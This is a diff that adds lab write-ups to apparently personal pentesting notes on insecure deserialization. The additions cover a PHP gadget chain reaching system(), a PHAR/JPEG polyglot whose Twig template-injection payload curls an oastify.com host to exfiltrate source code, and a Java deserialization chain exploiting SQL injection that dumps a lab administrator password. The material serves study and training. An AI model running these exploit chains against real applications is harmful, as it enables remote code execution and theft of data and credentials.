@@ -115,6 +115,100 @@ The PoC cookie value would be something like this:
 <@base64>O:9:"PageModel":1:{s:4:"file";s:33:"php://filter/resource=/etc/passwd";}<@/base64>
 ```
 
+## Custom PHP Object Injection  chain
+
+Class code and gadgets:
+```php
+<?php
+
+class CustomTemplate {
+    private $default_desc_type;
+    private $desc;
+    public $product;
+
+    public function __construct($desc_type='HTML_DESC') {
+        $this->desc = new Description();
+        $this->default_desc_type = $desc_type;
+        // Carlos thought this is cool, having a function called in two places... What a genius
+        $this->build_product();
+    }
+
+    ...
+
+	// __wakeup is our kick-off gadget
+    public function __wakeup() {
+        $this->build_product();
+    }
+
+	// build_product do not properly check the desc object type
+    private function build_product() {
+        $this->product = new Product($this->default_desc_type, $this->desc);
+    }
+}
+
+class Product {
+    public $desc;
+
+    public function __construct($default_desc_type, $desc) {
+        $this->desc = $desc->$default_desc_type;
+    }
+}
+
+class Description {
+    public $HTML_DESC;
+    public $TEXT_DESC;
+
+    public function __construct() {
+        // @Carlos, what were you thinking with these descriptions? Please refactor!
+        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
+        $this->TEXT_DESC = 'This product is cool in text';
+    }
+}
+
+class DefaultMap {
+    private $callback;
+
+    public function __construct($callback) {
+        $this->callback = $callback;
+    }
+
+	// __get is utilized for reading data from inaccessible (protected or private) or non-existing properties.
+    public function __get($name) { 
+        return call_user_func($this->callback, $name); // call_user_func allows to execute arbitrary commands
+    }
+}
+```
+
+PoC:
+```php
+<?php
+
+include('poc.php');
+
+
+$obj = new CustomTemplate();
+$obj->desc = new DefaultMap("system"); // set the variable "public" in the reference class
+$obj->default_desc_type = "id"; // set the variable "public" in the reference class
+
+$c = serialize($obj);
+echo $c;
+echo "\n\n";
+$c_e = base64_encode(serialize($obj));
+echo $c_e;
+echo "\n\n";
+unserialize($c);
+
+?>
+
+$ php asd.php
+O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:2:"id";s:4:"desc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:6:"system";}}
+
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI6ImlkIjtzOjQ6ImRlc2MiO086MTA6IkRlZmF1bHRNYXAiOjE6e3M6MjA6IgBEZWZhdWx0TWFwAGNhbGxiYWNrIjtzOjY6InN5c3RlbSI7fX0=
+
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),115(bluetooth),125(scanner),141(wireshark),143(kaboxer)
+
+```
+
 ### Bypass checks on serialized object exploiting parser differentials
 
 - [WAFfle-y Order](../../Play%20ground/CTFs/WAFfle-y%20Order.md)
@@ -122,6 +216,21 @@ The PoC cookie value would be something like this:
 ### PHAR deserialization
 
 In PHP it is sometimes possible to exploit deserialization even if there is no obvious use of the `unserialize()` method. This can be achieved though the `phar://` wrapper, which provides a stream interface for accessing PHP Archive (`.phar`) files. Those files contain **serialized metadata** that are implicitly deserialized when filesystem operations are performed on the `phar://` stream.
+
+>[!tip]
+>Dangerous filesystem methods, such as `include()` or `fopen()`, are likely protected by some kind of counter-measures. However, methods such as `file_exists()`, which are not so overtly dangerous, may not be as well protected.
+>Here is a list of filesystem functions that trigger phar deserialization:
+>
+>```
+copy                file_exists         file_get_contents   file_put_contents   
+file                fileatime           filectime           filegroup           
+fileinode           filemtime           fileowner           fileperms           
+filesize            filetype            fopen               is_dir              
+is_executable       is_file             is_link             is_readable         
+is_writable         lstat               mkdir               parse_ini_file      
+readfile            rename              rmdir               stat                
+touch               unlink
+>```
 
 >[!info] Pre-requisites:
 >- A **file upload primitive** allowing to upload a `PHAR` files or a **polyglot file** interpreted as it
@@ -132,6 +241,171 @@ As long as the class of the object is supported by the website, both the `__wak
 References:
 - [Top 10 web hacking techniques of 2018](https://portswigger.net/research/top-10-web-hacking-techniques-of-2018#6)
 - [PHAR Deserialization](https://portswigger.net/web-security/deserialization/exploiting#phar-deserialization)
+
+>[!example]
+>Server disclosed the following error: 
+> ```http
+> GET https://0a7f00910463d28d813a4823000200c6.web-security-academy.net/cgi-bin/avatar.php?avatar=asd:///etc/passwd HTTP/1.1
+> 
+>PHP Warning:  file_exists(): Unable to find the wrapper "gile" - did you forget to enable it when you configured PHP? in /home/carlos/cgi-bin/avatar.php on line 10 - Not Found
+>```
+
+*Blog.php~*
+```php
+<?php
+
+require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php'); // disclosed twig-1.19
+
+class Blog {
+    public $user;
+    public $desc;
+    private $twig;
+
+    public function __construct($user, $desc) {
+        $this->user = $user;
+        $this->desc = $desc;
+    }
+
+    public function __toString() {
+        return $this->twig->render('index', ['user' => $this->user]);
+    }
+
+    public function __wakeup() { // SSTI if we are able to control desc and "wakeup" an object
+        $loader = new Twig_Loader_Array([
+            'index' => $this->desc,
+        ]);
+        $this->twig = new Twig_Environment($loader);
+    }
+
+    public function __sleep() {
+        return ["user", "desc"];
+    }
+}
+
+?>
+```
+
+*CustomTemplate.php~*
+```php
+<?php
+
+class CustomTemplate {
+    private $template_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this->lockFilePath());
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lockFilePath(), "") === false) {
+                throw new Exception("Could not write to " . $this->lockFilePath());
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+
+    function __destruct() { // kick-off gadget initiating the chain
+        // Carlos thought this would be a good idea
+        @unlink($this->lockFilePath());
+    }
+
+    private function lockFilePath()
+    {
+        return 'templates/' . $this->template_file_path . '.lock';
+    }
+}
+?>
+```
+
+Poc exploiting a [Server Side Template Injection (SSTI)](Server%20Side%20Template%20Injection%20(SSTI).md) combined with the deserialization.vGenerated a PHP/JPEG polyglot image to bypass file upload restrictions still having a valid PHP [^polyglot] :
+
+[^polyglot]: https://github.com/kunte0/phar-jpg-polyglot/tree/master
+
+```php
+<?php
+
+function generate_base_phar($o, $prefix){
+    ...
+}
+
+function generate_polyglot($phar, $jpeg){
+    ...
+}
+
+
+// add object of any class as meta data
+class Blog {};
+class CustomTemplate {};
+$object = new CustomTemplate();
+$blog = new Blog();
+$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("curl http://srnvx8ptwvc6xlhwtdfvn7jds4yvmlaa.oastify.com/?$(cat /home/carlos/cgi-bin/avatar.php|base64 -w0)")}}{{_self.env.getFilter("cat /home/carlos/cgi-bin/avatar.php|base64 -w0")}}';
+$blog->user = 'user';
+$object->template_file_path = $blog;
+
+
+// config for jpg
+$tempname = 'temp.tar.phar'; // make it tar
+$jpeg = file_get_contents('in.jpg');
+$outfile = 'out.jpg';
+$payload = $object;
+$prefix = '';
+
+var_dump(serialize($object));
+
+
+// make jpg
+file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));
+
+/*
+// config for gif
+$prefix = "\x47\x49\x46\x38\x39\x61" . "\x2c\x01\x2c\x01"; // gif header, size 300 x 300
+$tempname = 'temp.phar'; // make it phar
+$outfile = 'out.gif';
+
+// make gif
+file_put_contents($outfile, generate_base_phar($payload, $prefix));
+
+*/
+```
+
+Deserialized the uploaded file and executed arbitrary code:
+`https://0a4e005b03cdec9d80802bd800e20052.web-security-academy.net/cgi-bin/avatar.php?avatar=phar://wiener`
+
+Exfiltrated *avatar.php*:
+```php
+<?php
+
+require_once('CustomTemplate.php');
+require_once('Blog.php');
+
+chdir('../avatars/');
+
+$avatar_file_path = $_GET['avatar'] . '.jpg';
+
+if (file_exists($avatar_file_path)) {
+    if (strpos($_GET['avatar'], "\\") !== false || strpos($_GET['avatar'], "/") !== false || strpos($_GET['avatar'], ".") !== false) {
+        throw new Exception("File name is invalid: " . $avatar_file_path);
+    }
+    header("content-type: image/jpeg");
+    readfile($avatar_file_path); // not checking for PHAR
+} else {
+    header("Status: 404 Not Found");
+    echo "Not Found";
+}
+
+?>
+```
 
 ## Python
 
@@ -225,6 +499,194 @@ Java (and some other languages) uses binary serialization formats. Serialized Ja
 >- `java.io.Serializable`
 >- `readObject()`
 
+### Custom Java deserialization chain
+
+1. After a login I'm provided with the following cookie:
+```
+rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBtaHVzN2thMXQzN2VzNHN1YnI1ZjZuNjQyb2thZnh3N3QABndpZW5lcg==
+```
+![](../../zzz_res/attachments/deserialization-java1.png)
+
+We can easily recognize it's a Java Object (it starts with `rO0` and contains different references to some Java elements).
+
+2. The web application discloses inside a comment a backup path whose main directory has indexing enabled, providing us with the access to the actual source code:
+```html
+</section>
+<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->
+</div>
+```
+
+*productTemplate.java*
+```java
+package data.productcatalog;
+
+import common.db.JdbcConnectionBuilder;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+import java.sql.Connection;
+import java.sql.ResultSet;
+import java.sql.SQLException;
+import java.sql.Statement;
+
+public class ProductTemplate implements Serializable
+{
+    static final long serialVersionUID = 1L;
+
+    private final String id;
+    private transient Product product;
+
+    public ProductTemplate(String id)
+    {
+        this.id = id;
+    }
+
+    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
+    {
+        inputStream.defaultReadObject();
+
+        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
+                "org.postgresql.Driver",
+                "postgresql",
+                "localhost",
+                5432,
+                "postgres",
+                "postgres",
+                "password"
+        ).withAutoCommit();
+        try
+        {
+            Connection connect = connectionBuilder.connect(30);
+            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
+            Statement statement = connect.createStatement();
+            ResultSet resultSet = statement.executeQuery(sql);
+            if (!resultSet.next())
+            {
+                return;
+            }
+            product = Product.from(resultSet);
+        }
+        catch (SQLException e)
+        {
+            throw new IOException(e);
+        }
+    }
+
+    public String getId()
+    {
+        return id;
+    }
+
+    public Product getProduct()
+    {
+        return product;
+    }
+}
+```
+
+3. We can notice that the `ProductTemplate` executes a query when it deserializes objects (`readObject`) without validating the `id`. We can deserialize arbitrary objects and exploit this SQL Injection in order to exfiltrate the database contents:
+
+*./Main.java*
+```java
+import data.productcatalog.ProductTemplate;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+import java.util.Base64;
+
+class Main {
+    public static void main(String[] args) throws Exception {
+        ProductTemplate originalObject = new ProductTemplate("1' ORDER BY 9 LIMIT 1-- -");
+        String serializedObject = serialize(originalObject);
+        System.out.println("Serialized object: " + serializedObject);
+
+        String obj = "<obj to deserialize>";
+        ProductTemplate deserializedObject = deserialize(obj);
+        System.out.println("Deserialized data id: " + deserializedObject.getId());
+    }
+
+    private static String serialize(Serializable obj) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
+        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
+            out.writeObject(obj);
+        }
+        return Base64.getEncoder().encodeToString(baos.toByteArray());
+    }
+
+    private static <T> T deserialize(String base64SerializedObj) throws Exception {
+        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
+            @SuppressWarnings("unchecked")
+            T obj = (T) in.readObject();
+            return obj;
+        }
+    }
+}
+```
+
+*./data/productcatalog/ProductTemplate.java*
+```java
+package data.productcatalog;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+import java.sql.Connection;
+import java.sql.ResultSet;
+import java.sql.SQLException;
+import java.sql.Statement;
+
+public class ProductTemplate implements Serializable
+{
+    static final long serialVersionUID = 1L;
+    private final String id;
+
+    public ProductTemplate(String id)
+    {
+        this.id = id;
+    }
+
+    public String getId()
+    {
+        return id;
+    }
+}
+```
+
+Generate the object and enumerated the number of columns, confirming the SQL Injection
+```bash
+$ javac Main.java && java Main
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAGTEnIE9SREVSIEJZIDkgTElNSVQgMS0tIC0=
+Deserialized data id: 1\' ORDER BY 9 LIMIT 1-- -
+
+<p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: ORDER BY position 9 is not in select list
+Position: 48</p>
+
+$ javac Main.java && java Main
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAGTEnIE9SREVSIEJZIDggTElNSVQgMS0tIC0=
+Deserialized data id: 1\' ORDER BY 8 LIMIT 1-- -
+
+<p class=is-warning>java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser</p>
+```
+
+4. Exploited an error-based [SQL Injection](SQL%20Injection.md) and exfiltrated the administrator password:
+```bash
+$ javac Main.java && java Main
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAYicgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIENBU1QocGFzc3dvcmQgQVMgbnVtZXJpYyksIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwgRlJPTSB1c2VycyAtLSAt
+Deserialized data id: '\' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users -- -'
+
+<p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;lpag2mjh4m8k3qvx87p2&quot;</p>
+```
+
+
 ## YAML
 
 **Old versions** of pyyaml (like SnakeYAML) were vulnerable to deserialisations attacks if you **didn't specify the Loader** when loading something: `yaml.load(data)`
@@ -311,6 +773,9 @@ Standard steps for research:
 		1. If not, take a closer look at each of the methods that they subsequently invoke, and so on.
 3. Repeat until you read a dead end or you identify a **dangerous sink gadget**
 4. Create a valid serialized object studying the class declaration in the source code
+
+>[!tip] Remember
+>For languages that supports package, remember to **use the same exact package structure**!
 
 ---
 
